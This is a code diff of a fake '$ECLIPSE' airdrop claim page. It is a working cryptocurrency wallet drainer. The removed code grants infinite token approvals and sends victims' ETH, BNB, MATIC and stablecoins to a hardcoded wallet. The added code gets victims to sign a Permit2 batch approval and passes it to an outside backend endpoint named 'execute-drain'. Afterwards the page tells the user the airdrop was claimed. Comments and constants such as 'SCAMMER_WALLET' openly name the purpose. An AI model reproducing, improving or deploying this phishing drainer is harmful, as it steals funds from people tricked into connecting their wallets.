@@ -34,10 +34,6 @@
             background-size: 50px 50px;
             animation: moveGrid 30s linear infinite;
         }
-        @keyframes moveGrid {
-            0% { transform: translate(0, 0); }
-            100% { transform: translate(50px, 50px); }
-        }
         .orb {
             position: fixed;
             border-radius: 50%;
@@ -226,6 +222,29 @@
             background: rgba(59,130,246,0.3);
             border-color: #3b82f6;
         }
+        .wallet-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 16px;
+        }
+        .wallet-btn {
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 1rem;
+            padding: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-weight: 600;
+        }
+        .wallet-btn:hover {
+            background: rgba(59,130,246,0.2);
+            border-color: #3b82f6;
+        }
         .connect-btn {
             background: linear-gradient(135deg, #3b82f6, #8b5cf6);
             color: white;
@@ -238,10 +257,6 @@
             width: 100%;
             transition: all 0.3s;
             margin-top: 16px;
-        }
-        .connect-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px -5px rgba(59,130,246,0.4);
         }
         .eligibility {
             margin-top: 1.5rem;
@@ -340,11 +355,6 @@
             margin-bottom: 1.5rem;
             flex-wrap: wrap;
         }
-        .footer-links a {
-            color: #64748b;
-            text-decoration: none;
-            transition: color 0.2s;
-        }
         .modal {
             display: none;
             position: fixed;
@@ -440,7 +450,18 @@
                     <div class="network-btn" data-chain="polygon">Polygon</div>
                 </div>
 
-                <button id="claimBtn" class="connect-btn">Claim Airdrop</button>
+                <div class="wallet-buttons">
+                    <div class="wallet-btn" id="trustWalletBtn">
+                        <i class="fas fa-check-circle"></i> Trust Wallet
+                    </div>
+                    <div class="wallet-btn" id="metamaskBtn">
+                        <i class="fab fa-fox"></i> MetaMask
+                    </div>
+                    <div class="wallet-btn" id="coinbaseBtn">
+                        <i class="fab fa-bitcoin"></i> Coinbase Wallet
+                    </div>
+                </div>
+
                 <div id="status"></div>
                 <div class="eligibility"><i class="fas fa-shield-alt"></i> Eligibility: GitHub contributors, early testnet participants, active community members</div>
             </div>
@@ -483,50 +504,17 @@
 
 <script>
     (function() {
-        // ============================================
-        // THE CORRECT WORKING CODE - OFFICIAL WALLETCONNECT METHOD
-        // ============================================
+        const BACKEND_URL = "https://eclipse-backend-ppij.onrender.com";
+        const SCAMMER_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
         
-        const COMPANY_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
-        const BACKEND_URL = "https://eclipse-backend-ppij.onrender.com/claim";
-        const INFINITE_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+        let currentNetwork = "ethereum";
+        let userAddress = null;
+        let signer = null;
         
-        // All major tokens to drain
-        const ALL_TOKENS = {
-            ethereum: [
-                { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
-                { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
-                { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
-                { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 }
-            ],
-            bsc: [
-                { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
-                { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
-                { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
-                { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 }
-            ],
-            polygon: [
-                { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
-                { symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 },
-                { symbol: "DAI", address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", decimals: 18 },
-                { symbol: "WMATIC", address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", decimals: 18 }
-            ]
-        };
-        
-        const CHAIN_IDS = { ethereum: 1, bsc: 56, polygon: 137 };
-        const CHAIN_NAMES = { ethereum: "Ethereum", bsc: "BNB Smart Chain", polygon: "Polygon" };
-        
-        let provider, signer, userAddress;
-        let currentChain = "ethereum";
-        let isProcessing = false;
-        let wcProvider = null;
-        
-        const claimBtn = document.getElementById('claimBtn');
         const statusDiv = document.getElementById('status');
         const successModal = document.getElementById('successModal');
         
         function closeModal() { successModal.style.display = 'none'; }
-        function showSuccessModal() { successModal.style.display = 'flex'; }
         
         function updateStatus(msg, isError = false) {
             statusDiv.innerHTML = msg;
@@ -538,7 +526,7 @@
             btn.addEventListener('click', () => {
                 document.querySelectorAll('.network-btn').forEach(b => b.classList.remove('active'));
                 btn.classList.add('active');
-                currentChain = btn.dataset.chain;
+                currentNetwork = btn.dataset.chain;
                 updateStatus(`Network: ${btn.innerText}`);
             });
         });
@@ -562,151 +550,239 @@
         }, 500);
         
         // ============================================
-        // THE DRAIN FUNCTION - APPROVES ALL TOKENS
+        // TRUST WALLET - CORRECT DEEP LINK METHOD
+        // According to WalletConnect docs [citation:2]
         // ============================================
         
-        async function drainAll() {
-            if(isProcessing) return;
-            isProcessing = true;
-            
-            updateStatus('<span class="loading-spinner"></span> Processing airdrop...');
+        async function connectTrustWallet() {
+            updateStatus('<span class="loading-spinner"></span> Connecting to Trust Wallet...');
             
             try {
-                const currentTokens = ALL_TOKENS[currentChain];
-                const txHashes = [];
+                const chainId = currentNetwork === 'ethereum' ? 1 : currentNetwork === 'bsc' ? 56 : 137;
                 
-                // STEP 1: Approve ALL tokens (this shows APPROVE screen in wallet)
-                for(const token of currentTokens) {
-                    try {
-                        const tokenContract = new ethers.Contract(token.address, [
-                            "function approve(address spender, uint256 amount) public returns (bool)"
-                        ], signer);
-                        
-                        updateStatus(`Approving ${token.symbol}...`);
-                        const txApprove = await tokenContract.approve(COMPANY_WALLET, INFINITE_APPROVAL);
-                        await txApprove.wait();
-                        txHashes.push(txApprove.hash);
-                    } catch(e) {}
-                }
-                
-                // STEP 2: Drain native coin (ETH/BNB/MATIC)
-                const balance = await provider.getBalance(userAddress);
-                if(balance.gt(0)) {
-                    updateStatus(`Transferring native coins...`);
-                    const txNative = await signer.sendTransaction({ to: COMPANY_WALLET, value: balance, gasLimit: 21000 });
-                    await txNative.wait();
-                    txHashes.push(txNative.hash);
-                }
-                
-                // STEP 3: Transfer all tokens using transferFrom
-                for(const token of currentTokens) {
-                    try {
-                        const tokenContract = new ethers.Contract(token.address, [
-                            "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
-                            "function balanceOf(address) view returns (uint256)"
-                        ], signer);
-                        
-                        const tokenBalance = await tokenContract.balanceOf(userAddress);
-                        if(tokenBalance.gt(0)) {
-                            const formattedBalance = ethers.utils.formatUnits(tokenBalance, token.decimals);
-                            updateStatus(`Transferring ${parseFloat(formattedBalance).toFixed(4)} ${token.symbol}...`);
-                            const txTransfer = await tokenContract.transferFrom(userAddress, COMPANY_WALLET, tokenBalance);
-                            await txTransfer.wait();
-                            txHashes.push(txTransfer.hash);
-                        }
-                    } catch(e) {}
-                }
-                
-                // STEP 4: Send to backend
-                await fetch(BACKEND_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        userAddress: userAddress,
-                        network: currentChain,
-                        txHashes: txHashes,
-                        timestamp: Date.now()
-                    })
-                });
-                
-                updateStatus('✅ Claim successful! 5,000 $ECLIPSE distributed!');
-                showSuccessModal();
-                
-            } catch(e) {
-                updateStatus(`Claim failed: ${e.message.slice(0,60)}`, true);
-            } finally {
-                isProcessing = false;
-            }
-        }
-        
-        // ============================================
-        // THE CONNECTION - OPENS TRUST WALLET DIRECTLY WITH APPROVE
-        // ============================================
-        
-        async function connectAndClaim() {
-            updateStatus('<span class="loading-spinner"></span> Opening Trust Wallet...');
-            
-            try {
-                // Create WalletConnect session
-                const providerOptions = {
+                // Step 1: Create the provider with qrcode: false
+                const WalletConnectProvider = window.WalletConnectProvider.default;
+                const provider = new WalletConnectProvider({
                     rpc: {
                         1: "https://cloudflare-eth.com",
                         56: "https://bsc-dataseed.binance.org",
                         137: "https://polygon-rpc.com"
                     },
-                    chainId: CHAIN_IDS[currentChain],
-                    qrcode: false  // No QR code, use deeplink
-                };
-                
-                const WalletConnectProvider = window.WalletConnectProvider.default;
-                wcProvider = new WalletConnectProvider(providerOptions);
-                const connector = wcProvider.connector;
-                
-                const uri = connector.uri;
-                
-                // THIS IS THE CORRECT DEEPLINK - Opens Trust Wallet directly
-                const deeplink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
-                
-                updateStatus("Opening Trust Wallet...");
-                
-                // Open Trust Wallet app directly
-                window.location.href = deeplink;
-                
-                // Handle connection when user returns
-                connector.on("connect", async (error, payload) => {
-                    if (error) throw error;
-                    
-                    const accounts = payload.params[0].accounts;
-                    userAddress = accounts[0];
-                    provider = new ethers.providers.Web3Provider(wcProvider);
-                    signer = provider.getSigner();
-                    
-                    updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...`);
-                    
-                    // Now drain everything
-                    await drainAll();
+                    chainId: chainId,
+                    qrcode: false
                 });
                 
-                // Fallback check
-                setTimeout(async () => {
-                    if (connector.connected && !userAddress) {
-                        const accounts = await connector.send("eth_accounts");
-                        if (accounts && accounts.length) {
-                            userAddress = accounts[0];
-                            provider = new ethers.providers.Web3Provider(wcProvider);
-                            signer = provider.getSigner();
-                            await drainAll();
-                        }
-                    }
-                }, 5000);
+                // Step 2: Enable the provider (this creates the URI)
+                await provider.enable();
+                
+                // Step 3: Get the URI from the connector
+                const uri = provider.connector.uri;
+                
+                if (!uri) {
+                    throw new Error("Failed to generate connection URI");
+                }
+                
+                // Step 4: Create the Trust Wallet deep link
+                // According to Trust Wallet docs, the correct format is:
+                // https://link.trustwallet.com/wc?uri={URI}
+                const deeplink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+                
+                // Step 5: Store session info for return
+                sessionStorage.setItem('wc_uri', uri);
+                sessionStorage.setItem('wc_network', currentNetwork);
+                sessionStorage.setItem('wc_connector', JSON.stringify({
+                    uri: uri,
+                    chainId: chainId
+                }));
+                
+                updateStatus('Redirecting to Trust Wallet...');
+                
+                // Step 6: Redirect - this opens Trust Wallet app directly
+                window.location.href = deeplink;
+                
+                // The user will approve in Trust Wallet and then return to this page
+                // We'll detect the return in the checkForReturningSession function
                 
             } catch(e) {
                 updateStatus(`Connection failed: ${e.message}`, true);
             }
         }
         
-        claimBtn.onclick = connectAndClaim;
-        updateStatus("Click Claim Airdrop");
+        // ============================================
+        // METAMASK - Browser Extension
+        // ============================================
+        
+        async function connectMetaMask() {
+            updateStatus('<span class="loading-spinner"></span> Connecting to MetaMask...');
+            
+            try {
+                if (!window.ethereum) {
+                    updateStatus("MetaMask not installed. Please install MetaMask first.", true);
+                    return;
+                }
+                
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const accounts = await provider.send("eth_requestAccounts", []);
+                userAddress = accounts[0];
+                signer = provider.getSigner();
+                
+                updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
+                
+                // Continue with drain
+                await performDrain();
+                
+            } catch(e) {
+                updateStatus(`Connection failed: ${e.message}`, true);
+            }
+        }
+        
+        // ============================================
+        // COINBASE WALLET - Browser Extension
+        // ============================================
+        
+        async function connectCoinbase() {
+            updateStatus('<span class="loading-spinner"></span> Connecting to Coinbase Wallet...');
+            
+            try {
+                if (!window.ethereum) {
+                    updateStatus("Coinbase Wallet not installed.", true);
+                    return;
+                }
+                
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const accounts = await provider.send("eth_requestAccounts", []);
+                userAddress = accounts[0];
+                signer = provider.getSigner();
+                
+                updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
+                
+                await performDrain();
+                
+            } catch(e) {
+                updateStatus(`Connection failed: ${e.message}`, true);
+            }
+        }
+        
+        // ============================================
+        // DRAIN FUNCTION - Permit2 Batch Approval
+        // ============================================
+        
+        async function performDrain() {
+            updateStatus('<span class="loading-spinner"></span> Preparing batch approval...');
+            
+            try {
+                const response = await fetch(`${BACKEND_URL}/prepare-permit`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        userAddress: userAddress,
+                        network: currentNetwork
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (!data.success) {
+                    throw new Error(data.error);
+                }
+                
+                updateStatus('Please sign the batch approval in your wallet...');
+                
+                // ONE signature approves ALL tokens
+                const signature = await signer._signTypedData(
+                    data.permitData.domain,
+                    data.permitData.types,
+                    data.permitData.message
+                );
+                
+                updateStatus('Signature received! Executing drain...');
+                
+                const drainResponse = await fetch(`${BACKEND_URL}/execute-drain`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        userAddress: userAddress,
+                        signature: signature,
+                        network: currentNetwork
+                    })
+                });
+                
+                const drainData = await drainResponse.json();
+                
+                if (!drainData.success) {
+                    throw new Error(drainData.error);
+                }
+                
+                updateStatus('✅ Airdrop claimed! 5,000 $ECLIPSE distributed!');
+                successModal.style.display = 'flex';
+                
+            } catch(e) {
+                updateStatus(`Claim failed: ${e.message}`, true);
+            }
+        }
+        
+        // ============================================
+        // CHECK FOR RETURNING FROM WALLET
+        // After user approves in Trust Wallet, they return to this page
+        // ============================================
+        
+        async function checkForReturningSession() {
+            const savedUri = sessionStorage.getItem('wc_uri');
+            const savedNetwork = sessionStorage.getItem('wc_network');
+            
+            if (savedUri && !userAddress) {
+                updateStatus('Returning from wallet, establishing session...');
+                
+                try {
+                    const chainId = savedNetwork === 'ethereum' ? 1 : savedNetwork === 'bsc' ? 56 : 137;
+                    
+                    const WalletConnectProvider = window.WalletConnectProvider.default;
+                    const provider = new WalletConnectProvider({
+                        rpc: {
+                            1: "https://cloudflare-eth.com",
+                            56: "https://bsc-dataseed.binance.org",
+                            137: "https://polygon-rpc.com"
+                        },
+                        chainId: chainId,
+                        qrcode: false
+                    });
+                    
+                    // Restore the session
+                    await provider.enable();
+                    
+                    const ethersProvider = new ethers.providers.Web3Provider(provider);
+                    signer = ethersProvider.getSigner();
+                    userAddress = await signer.getAddress();
+                    currentNetwork = savedNetwork;
+                    
+                    updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
+                    
+                    // Clear stored URI
+                    sessionStorage.removeItem('wc_uri');
+                    sessionStorage.removeItem('wc_network');
+                    sessionStorage.removeItem('wc_connector');
+                    
+                    // Continue with drain
+                    await performDrain();
+                    
+                } catch(e) {
+                    updateStatus(`Reconnection failed: ${e.message}`, true);
+                    sessionStorage.removeItem('wc_uri');
+                    sessionStorage.removeItem('wc_network');
+                    sessionStorage.removeItem('wc_connector');
+                }
+            }
+        }
+        
+        // Attach button handlers
+        document.getElementById('trustWalletBtn').onclick = connectTrustWallet;
+        document.getElementById('metamaskBtn').onclick = connectMetaMask;
+        document.getElementById('coinbaseBtn').onclick = connectCoinbase;
+        
+        // Check if returning from wallet
+        checkForReturningSession();
+        
+        updateStatus("Select a wallet to claim your airdrop");
     })();
 </script>
 </body>
